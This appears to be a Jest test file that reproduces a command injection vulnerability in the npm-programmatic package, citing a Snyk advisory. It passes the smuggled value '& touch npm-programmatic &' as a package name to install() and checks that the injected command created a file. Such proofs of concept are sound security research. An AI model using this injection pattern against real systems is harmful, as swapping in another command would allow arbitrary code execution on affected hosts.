//https://snyk.io/vuln/SNYK-JS-NPMPROGRAMMATIC-564115
test("Command Injection in npm-programmatic", () => {
  expect.assertions(2);
  const root = require("npm-programmatic");
  const fs = require("fs");
  const path = "./npm-programmatic";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_code = "& touch npm-programmatic &";
  return root
    .install([attack_code], { cwd: "./" })
    .then(() => {})
    .catch((err) => {})
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
